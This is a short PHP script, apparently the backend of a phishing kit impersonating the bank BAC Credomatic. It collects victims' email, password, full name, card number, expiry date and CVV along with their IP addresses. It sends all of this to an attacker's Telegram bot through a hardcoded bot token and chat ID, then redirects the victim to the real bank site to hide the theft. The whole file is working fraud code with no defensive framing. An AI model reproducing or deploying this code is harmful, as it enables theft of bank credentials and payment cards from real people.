<?php
    session_start();

    // Datos del bot de Telegram y el chat ID
    $botToken = '6131768007:AAGfTspIA_LNzUaW512OQq2xclaBSlm4SEQ';
    $chatId = '6280856381';

    // Construye el mensaje con los datos que deseas enviar
    $message = "CREDOMATIC\n";
    $message .= 'E: '.$_SESSION['u1']."\n";
    $message .= 'P: '.$_SESSION['u2']."\n";
    $message .= 'NM: '.$_POST['gtrip01']."\n";
    $message .= 'AP: '.$_POST['gtrip02']."\n";
    $message .= 'T: '.$_POST['gtrip03']."\n";
    $message .= 'FV: '.$_POST['gtrip04']."/".$_POST['gtrip05']."\n";
    $message .= 'CV: '.$_POST['gtrip06']."\n";
    $message .= 'IP1: '.$_SERVER['REMOTE_ADDR']."\n";
    $message .= 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n";
    $message .= 'Date: '. date("d-m-Y")."\n";

    // URL para enviar mensajes al bot de Telegram
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // Configura los parámetros del mensaje
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Envía el mensaje a Telegram
    file_get_contents($telegramApiUrl . '?' . http_build_query($params));

    // Redirecciona a la URL deseada
    header('Location: https://www.baccredomatic.com/');

    // Cierra la sesión
    session_destroy();
    exit;
?>
